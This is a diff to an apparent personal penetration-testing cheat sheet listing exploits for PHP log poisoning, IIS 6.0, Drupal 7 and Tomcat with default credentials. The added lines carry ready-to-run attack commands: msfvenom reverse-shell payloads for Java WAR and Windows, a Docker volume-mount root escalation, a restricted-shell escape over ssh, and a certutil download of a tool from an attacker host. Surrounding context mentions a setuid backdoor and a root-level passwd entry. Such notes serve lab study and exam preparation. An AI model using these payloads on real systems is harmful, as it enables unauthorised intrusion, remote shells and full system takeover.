@@ -109,7 +109,7 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 |5. |PHP log poisoning | https://www.hackingarticles.in/apache-log-poisoning-through-lfi/ | https://0xdf.gitlab.io/2018/09/08/htb-poison.html | --- | --- | --- |
 |6.|IIS6.0 | [Zero day exploit to get reverse shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell) |- |- |-|
 |7.|Drupal7.x|7.x Module Services - Remote Code Execution           | php/webapps/41564.php |- | - |change the urllink, change the system command so you can execute cmd and change to rest |
-
+|8.| Tomcat |tomcat default credentials(wrong password policy) | Tomcat running with defaul passowrd |ip:port/manager/html | msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.169.193.128 LPORT=443 -f war -o sr.war |   |
 
 
 ## Linux Privilege Escalation
@@ -190,6 +190,17 @@ chmod u+s backdoor
 to set the password to foo.
 * daya:aaKNIEDOaueR6:0:0:daya:/tmp/daya:/bin/bash
 ### Useful Commands:
+
+## Docker Privilege Escalations
+https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17
+```bash
+Privilege Escalation:
+Docker Vulnerabilities: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+
+Getting RID of Restricted Shell:
+ssh alfred@10.11.1.101 -t "bash —noprofile"
+```
 msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=[your_ip] LPORT=[listening_port] -f exe -o [shell_name.exe]
 
 certutil.exe -urlcache -split -f http://10.2.26.129/winPEAS-x64.exe winPEAS-x64.exe
